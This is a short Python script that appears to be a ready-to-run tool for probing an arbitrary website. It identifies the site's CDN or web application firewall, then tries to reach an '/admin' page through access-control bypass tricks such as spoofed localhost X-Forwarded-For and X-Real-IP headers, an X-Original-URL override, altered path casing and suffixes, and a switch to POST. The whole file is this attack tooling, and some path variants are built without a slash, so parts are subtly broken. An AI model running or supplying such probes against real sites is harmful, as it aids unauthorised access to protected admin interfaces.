import aiohttp
import asyncio
import sys

class WAFBypasser:
    def __init__(self, target):
        self.target = target.rstrip('/')
        
    async def detect(self):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(self.target, timeout=5) as resp:
                    headers = str(resp.headers).lower()
                    if 'cloudflare' in headers: return 'cloudflare'
                    if 'vercel' in headers: return 'vercel'
                    if 'x-amz' in headers: return 'aws'
                    return None
            except:
                return None
    
    async def bypass(self, path='admin'):
        results = []
        techniques = [
            {"headers": {"X-Forwarded-For": "127.0.0.1"}},
            {"headers": {"X-Original-URL": "/admin"}},
            {"headers": {"X-Real-IP": "127.0.0.1"}},
            {"path": path.upper()},
            {"path": path[0].upper() + path[1:]},
            {"path": f"/{path}/."},
            {"path": f"/{path}/*"},
            {"method": "POST"},
        ]
        
        async with aiohttp.ClientSession() as session:
            for t in techniques:
                try:
                    url = self.target
                    if 'path' in t:
                        url += t['path']
                    else:
                        url += f"/{path}"
                    
                    headers = t.get('headers', {})
                    method = t.get('method', 'GET')
                    
                    async with session.request(method, url, headers=headers, timeout=3, allow_redirects=False) as resp:
                        results.append({
                            'technique': str(t)[:30],
                            'url': url,
                            'status': resp.status,
                            'method': method
                        })
                except:
                    pass
        return results

async def main():
    if len(sys.argv) < 2:
        print("Uso: python3 waf_bypasser.py <URL>")
        sys.exit(1)
    
    bypasser = WAFBypasser(sys.argv[1])
    waf = await bypasser.detect()
    print(f"🛡️ WAF: {waf if waf else 'No detectado'}")
    
    results = await bypasser.bypass()
    print(f"\n📊 Resultados bypass:")
    for r in results[:10]:
        print(f"   {r['method']} {r['url']} → {r['status']}")

if __name__ == "__main__":
    asyncio.run(main())
